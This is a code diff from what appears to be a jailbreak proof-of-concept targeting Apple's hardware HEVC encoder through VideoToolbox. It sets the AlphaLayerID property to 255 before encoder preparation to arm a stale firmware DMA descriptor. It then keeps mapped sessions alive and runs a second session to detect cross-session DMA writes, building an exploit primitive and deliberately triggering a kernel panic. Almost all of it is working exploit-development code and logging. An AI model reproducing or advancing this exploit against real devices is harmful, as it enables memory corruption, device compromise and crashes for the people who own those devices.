@@ -3839,9 +3839,9 @@ static void runDPrep2(void) {
 
     pocLog(@"");
     pocLog(@"╔═══════════════════════════════════════════╗");
-    pocLog(@"║  D-PREP-2 v3: ARM-FIRST Bitstream Readout ║");
-    pocLog(@"║  Canary → SET 255 → arm (frame #1) →     ║");
-    pocLog(@"║  clear → continuous canary (train+test)   ║");
+    pocLog(@"║  D-PREP-2 v4: TWO-SESSION (Alpha→Prepare) ║");
+    pocLog(@"║  Canary → trigger(255) → obs(clean) →    ║");
+    pocLog(@"║  continuous canary on obs (train+test)    ║");
     pocLog(@"║  T+0-45s = envelope training set          ║");
     pocLog(@"║  T+60s+  = test set (fire expected 90-160)║");
     pocLog(@"║  *** WILL PANIC ~90-160s after arm ***    ║");
@@ -3863,67 +3863,48 @@ static void runDPrep2(void) {
     PASS(@"CANARY OK.");
     idleWait(5, @"canary cooldown");
 
-    // Step 2: Create the D-prep-2 session — ARM IMMEDIATELY
-    // Matches every proven arm topology: Alpha=255 on session's 2nd frame.
-    LOG(@"--- STEP 2: CREATE + ARM (session's 2nd frame) ---");
+    // Step 2: CREATE TRIGGER SESSION + ARM
+    // Alpha MUST be set BEFORE PrepareToEncodeFrames — VPS is generated
+    // at prepare time. Late SET stores the value (readback works) but
+    // doesn't regenerate VPS, so firmware never sees it → no -17691.
+    // This matches the working phase2Encode topology exactly.
+    LOG(@"--- STEP 2: TRIGGER SESSION (Alpha before Prepare) ---");
 
     NSDictionary *spec = @{
         (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
         (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
     };
 
-    VTCompressionSessionRef session = NULL;
+    VTCompressionSessionRef triggerSession = NULL;
     OSStatus status = VTCompressionSessionCreate(
         kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
         (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
-        dprep2Callback, NULL, &session);
+        dprep2Callback, NULL, &triggerSession);
 
     if (status != noErr) {
-        FAIL(@"Session creation failed: %d", (int)status);
+        FAIL(@"Trigger session creation failed: %d", (int)status);
         g_phase2Running = NO;
         return;
     }
 
-    status = VTCompressionSessionPrepareToEncodeFrames(session);
-    if (status != noErr) {
-        FAIL(@"PrepareToEncode failed: %d", (int)status);
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
-        g_phase2Running = NO;
-        return;
-    }
-
-    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
-    if (!pb) {
-        FAIL(@"Pixel buffer failed");
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
-        g_phase2Running = NO;
-        return;
-    }
-
-    dp2FreeSamples();
-    dp2FreeArchive();
-    g_dp2Armed = NO;
-
-    // Frame 0: clean encode (session priming, no AlphaLayerID)
-    LOG(@"Encoding frame 0 (clean, priming)...");
-    CMTime pts0 = CMTimeMake(0, 30);
-    VTCompressionSessionEncodeFrame(session, pb, pts0,
-        kCMTimeInvalid, NULL, NULL, NULL);
-    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-    [NSThread sleepForTimeInterval:1.0];
-    PASS(@"Frame 0 (prime): %d samples, %d errors", g_dp2SampleIdx, g_dp2Errors);
-
-    // SET AlphaLayerID=255 + readback verify
-    status = VTSessionSetProperty(session,
+    // SET Alpha BEFORE Prepare — VPS generated at prepare time
+    status = VTSessionSetProperty(triggerSession,
         CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
         (__bridge CFTypeRef)@(255));
-    INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
+    INFO(@"SET AlphaLayerID=255 (pre-prepare): %s", status == noErr ? "OK" : "REJECTED");
 
-    // Readback verify (three-layer methodology)
+    status = VTCompressionSessionPrepareToEncodeFrames(triggerSession);
+    if (status != noErr) {
+        FAIL(@"PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(triggerSession);
+        CFRelease(triggerSession);
+        g_phase2Running = NO;
+        return;
+    }
+
+    // Readback verify
     CFTypeRef readback = NULL;
-    VTSessionCopyProperty(session,
+    VTSessionCopyProperty(triggerSession,
         CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
         kCFAllocatorDefault, &readback);
     if (readback) {
@@ -3938,21 +3919,31 @@ static void runDPrep2(void) {
         INFO(@"Readback: property not readable (SET may still have stuck)");
     }
 
-    // ARM: frame 1 with Alpha=255 — session's 2nd frame, matching C1 topology
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) {
+        FAIL(@"Pixel buffer failed");
+        VTCompressionSessionInvalidate(triggerSession);
+        CFRelease(triggerSession);
+        g_phase2Running = NO;
+        return;
+    }
+
+    dp2FreeSamples();
+    dp2FreeArchive();
+    g_dp2Armed = NO;
+
+    // ARM: frame 0 — session's FIRST frame, matching phase2Encode topology
     g_dp2ArchiveArmMark = g_dp2ArchiveIdx;
     NSString *armTime = [fmt stringFromDate:[NSDate date]];
     LOG(@"ARM time: %@ (archive mark: %d)", armTime, g_dp2ArchiveArmMark);
-    os_log(dLog, "JBPoC-DPREP2v3-ARM %{public}@ archiveMark=%d", armTime, g_dp2ArchiveArmMark);
+    os_log(dLog, "JBPoC-DPREP2v4-ARM %{public}@ archiveMark=%d", armTime, g_dp2ArchiveArmMark);
 
-    CMTime armPTS = CMTimeMake(1, 30);
-    status = VTCompressionSessionEncodeFrame(session, pb,
+    CMTime armPTS = CMTimeMake(0, 30);
+    status = VTCompressionSessionEncodeFrame(triggerSession, pb,
         armPTS, kCMTimeInvalid, NULL, NULL, NULL);
-    INFO(@"Armed encode submitted (frame 1): %d", (int)status);
+    INFO(@"Armed encode submitted (frame 0): %d", (int)status);
 
-    // Flush the frame to hardware — without this, VT buffers it internally
-    // and the frame never reaches AVE2 firmware. Every successful arm in
-    // phase2Encode calls CompleteFrames; D-prep-2 was missing it.
-    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    VTCompressionSessionCompleteFrames(triggerSession, kCMTimeInvalid);
 
     // Wait for -17691
     LOG(@"Waiting for -17691 (up to 130s)...");
@@ -3966,14 +3957,14 @@ static void runDPrep2(void) {
 
     if (!g_dp2Armed) {
         FAIL(@"Did not get -17691 after 130s.");
-        LOG(@"Logging as no-fire run. Session conditions: frame #1, warm videocodecd.");
-        LOG(@"NOT invalidating — session stays alive for observation.");
+        LOG(@"Logging as no-fire run. Alpha set pre-prepare, frame 0.");
+        LOG(@"NOT invalidating — trigger session stays alive.");
         LOG(@"If panic comes at ~160s, this is a watchdog-path variant.");
 
         NSString *noFireResult = [NSString stringWithFormat:
-            @"D-PREP-2 v3 NO-ARM\nDate: %@\nARM attempt: %@\n"
+            @"D-PREP-2 v4 NO-ARM\nDate: %@\nARM attempt: %@\n"
             @"Condition: -17691 not received in 130s\n"
-            @"Session: frame 1, 2nd frame of session\n"
+            @"Session: frame 0, Alpha pre-prepare\n"
             @"Archive: %d samples\n",
             [NSDate date], armTime, g_dp2ArchiveIdx];
         NSString *noFirePath = [NSHomeDirectory()
@@ -3981,34 +3972,51 @@ static void runDPrep2(void) {
         [noFireResult writeToFile:noFirePath atomically:YES
                          encoding:NSUTF8StringEncoding error:nil];
 
-        // Do NOT invalidate — leave session alive, keep PTEs mapped
+        // Do NOT invalidate — leave trigger session alive, keep PTEs mapped
         // If panic comes later, the .ips is still valid data
         g_phase2Running = NO;
         return;
     }
     PASS(@"Armed (-17691). Firmware DMA descriptor is stale-armed.");
-    os_log(dLog, "JBPoC-DPREP2v3-ARMED");
+    os_log(dLog, "JBPoC-DPREP2v4-ARMED");
 
-    // Step 3: Clear Alpha, continuous canary encode for 240s
-    // T+0-45s = envelope training set (presumptively clean)
-    // T+60s+  = test set (fire expected T+90-160s)
-    // One shared callback path — eliminates wiring bug by construction.
+    // Step 3: OBSERVATION SESSION — continuous canary encode for 240s
+    // Trigger session stays alive (PTEs mapped). Observation session is
+    // separate (no Alpha) and encodes clean frames for anomaly detection.
+    // If DVA reuse puts obs surfaces in trigger's stale-DMA range, we detect it.
     LOG(@"");
-    LOG(@"--- STEP 3: KEEP-ALIVE ENCODE + READOUT (240s) ---");
-    LOG(@"Encoding canary frames every 5s on the armed session.");
-    LOG(@"T+0-45s: training (building envelope from post-arm cleans).");
-    LOG(@"T+60s+:  testing (diffing against envelope, Q4 signals active).");
-    LOG(@"Session PTEs still valid — if model (b), write lands here.");
-    pocLog(@"");
+    LOG(@"--- STEP 3: OBSERVATION SESSION + READOUT (240s) ---");
 
-    status = VTSessionSetProperty(session,
-        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
-        (__bridge CFTypeRef)@(0));
-    INFO(@"Cleared AlphaLayerID to 0: %s", status == noErr ? "OK" : "FAIL");
+    VTCompressionSessionRef obsSession = NULL;
+    status = VTCompressionSessionCreate(
+        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+        dprep2Callback, NULL, &obsSession);
+    if (status != noErr) {
+        FAIL(@"Observation session creation failed: %d", (int)status);
+        LOG(@"Trigger session stays alive — panic may still come.");
+        g_phase2Running = NO;
+        return;
+    }
+    status = VTCompressionSessionPrepareToEncodeFrames(obsSession);
+    if (status != noErr) {
+        FAIL(@"Observation PrepareToEncode failed: %d", (int)status);
+        VTCompressionSessionInvalidate(obsSession);
+        CFRelease(obsSession);
+        LOG(@"Trigger session stays alive — panic may still come.");
+        g_phase2Running = NO;
+        return;
+    }
+    PASS(@"Observation session ready (no Alpha, clean encode path).");
+    LOG(@"Encoding canary frames every 5s on observation session.");
+    LOG(@"T+0-45s: training (building envelope).");
+    LOG(@"T+60s+:  testing (diffing against envelope, Q4 signals active).");
+    LOG(@"Trigger session PTEs still valid — watching for cross-session DMA.");
+    pocLog(@"");
 
     int hitCount = 0;
     int firstHitTime = -1;
-    int frameNum = 2; // frame 0=prime, 1=arm, 2+=canary
+    int frameNum = 0; // obs session starts at frame 0
     NSDate *armDate = [NSDate date];
     NSMutableString *hitReport = [NSMutableString string];
 
@@ -4042,12 +4050,12 @@ static void runDPrep2(void) {
         int elapsed = (int)[[NSDate date] timeIntervalSinceDate:armDate];
         NSString *now = [fmt stringFromDate:[NSDate date]];
 
-        // Encode a canary frame
+        // Encode a canary frame on observation session
         dp2FreeSamples();
         CMTime pts = CMTimeMake(frameNum++, 30);
-        VTCompressionSessionEncodeFrame(session, pb, pts,
+        VTCompressionSessionEncodeFrame(obsSession, pb, pts,
             kCMTimeInvalid, NULL, NULL, NULL);
-        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        VTCompressionSessionCompleteFrames(obsSession, kCMTimeInvalid);
         [NSThread sleepForTimeInterval:0.5];
 
         if (g_dp2SampleIdx > 0) {
@@ -4081,7 +4089,7 @@ static void runDPrep2(void) {
                     }
                     PASS(@"Envelope built: %zu training samples, %zu bytes, %d invariant (%.1f%%)",
                          trainBS.count, baseMaxLen, inv, 100.0 * inv / baseMaxLen);
-                    os_log(dLog, "JBPoC-DPREP2v3-ENVELOPE train=%zu len=%zu inv=%d",
+                    os_log(dLog, "JBPoC-DPREP2v4-ENVELOPE train=%zu len=%zu inv=%d",
                            trainBS.count, baseMaxLen, inv);
                 }
             } else if (elapsed >= DPREP2_TEST_START_S && curBS && curBS.length > 0) {
@@ -4096,9 +4104,9 @@ static void runDPrep2(void) {
                 if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
                     memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
                     memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
-                    // Armed encode was frame 1. If we see frame#=1 in a
-                    // post-arm canary output, the stale DMA write landed.
-                    if (fwFrame == 1 && tick > 2) {
+                    // Armed encode was frame 0 on trigger session. If we see
+                    // stale frame# in obs session output, DMA crossed sessions.
+                    if (fwFrame == 0 && tick > 2) {
                         fwMetaHit = YES;
                         PASS(@"*** Q4 PRIMARY HIT: frame# at +0xa8 = %u (armed frame!) ***",
                              fwFrame);
@@ -4185,7 +4193,7 @@ static void runDPrep2(void) {
                         elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize,
                         sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_META" : ""];
 
-                    os_log(dLog, "JBPoC-DPREP2v3-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
+                    os_log(dLog, "JBPoC-DPREP2v4-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
                            elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize, (int)fwMetaHit);
 
                     // On first hit: dump entire retained archive
@@ -4208,7 +4216,7 @@ static void runDPrep2(void) {
                             @"%@/HIT_T%03d.bin", archDir, elapsed];
                         [curBS writeToFile:hitFn atomically:YES];
                         PASS(@"Archive dumped: %d samples to %@", g_dp2ArchiveIdx, archDir);
-                        os_log(dLog, "JBPoC-DPREP2v3-ARCHIVE dumped=%d", g_dp2ArchiveIdx);
+                        os_log(dLog, "JBPoC-DPREP2v4-ARCHIVE dumped=%d", g_dp2ArchiveIdx);
                     }
                 } else if (elapsed % 30 == 0 || elapsed == DPREP2_TEST_START_S) {
                     INFO(@"T+%03ds (%@): OK (%zu B, fw_frame=%u fw_size=%u, 0 anomalies)",
@@ -4254,7 +4262,7 @@ static void runDPrep2(void) {
         LOG(@"Total hits: %d, first at T+%ds post-arm", hitCount, firstHitTime);
         LOG(@"The write succeeds harmlessly into the still-mapped buffer.");
         LOG(@"Primitive = arm + keep-alive + read output. Mode A likely unnecessary.");
-        os_log(dLog, "JBPoC-DPREP2-RESULT MODEL_B hits=%d firstAt=%d", hitCount, firstHitTime);
+        os_log(dLog, "JBPoC-DPREP2v4-RESULT MODEL_B hits=%d firstAt=%d", hitCount, firstHitTime);
     } else {
         INFO(@"No anomalies in bitstream or input over 240s.");
         pocLog(@"");
@@ -4272,13 +4280,13 @@ static void runDPrep2(void) {
             INFO(@"  Invariant bytes: %d/%zu (%.1f%%) — these would catch corruption",
                  inv, baseMaxLen, 100.0 * inv / baseMaxLen);
         }
-        os_log(dLog, "JBPoC-DPREP2v3-RESULT NO_HITS train=%zu", trainBS.count);
+        os_log(dLog, "JBPoC-DPREP2v4-RESULT NO_HITS train=%zu", trainBS.count);
     }
     LOG(@"═══════════════════════════════════════════════");
 
     // Write results
     NSString *resultStr = [NSString stringWithFormat:
-        @"D-PREP-2 v3 RESULT (arm-first)\nDate: %@\nARM: %@\n"
+        @"D-PREP-2 v4 RESULT (two-session)\nDate: %@\nARM: %@\n"
         @"Training samples: %zu\nMax bitstream: %zu\n"
         @"Archive samples: %d (arm mark: %d)\n"
         @"Q4 offsets: frame#+0xa8, coded_size+0xac, bitstream+0x1270\n"
@@ -4305,10 +4313,12 @@ static void runDPrep2(void) {
     // The session + pixel buffer leak intentionally. The process keeps them
     // alive. The panic will come. Keep the .ips!
     LOG(@"");
-    LOG(@"*** NOT invalidating session — PTEs stay mapped. ***");
+    LOG(@"*** NOT invalidating trigger or obs session — PTEs stay mapped. ***");
+    LOG(@"Trigger session: Alpha=255, armed DMA descriptor stale.");
+    LOG(@"Observation session: clean, canary frames recorded.");
     LOG(@"The stale descriptor fires via idle timer (~90-160s post-arm).");
-    LOG(@"If it panics with DVA in the session's mapped range → write succeeded");
-    LOG(@"silently, and D-prep-2 missed it (noise? wrong region?).");
+    LOG(@"If it panics with DVA in trigger's mapped range → write succeeded");
+    LOG(@"silently (noise? wrong region?). If in obs range → cross-session DMA.");
     LOG(@"If no panic within ~200s → fire needs teardown trigger (F≈U).");
     LOG(@"Keep the .ips!");
 
@@ -4318,7 +4328,7 @@ static void runDPrep2(void) {
     dp2FreeSamples();
     // Archive intentionally NOT freed — retained for post-panic recovery
     // dp2FreeArchive() would destroy the evidence
-    // Intentionally NOT releasing session, pb — keep PTEs alive
+    // Intentionally NOT releasing trigger/obs sessions, pb — keep PTEs alive
     g_phase2Running = NO;
 
     PASS(@"D-PREP-2 readout complete. Archive: %d samples retained.", g_dp2ArchiveIdx);
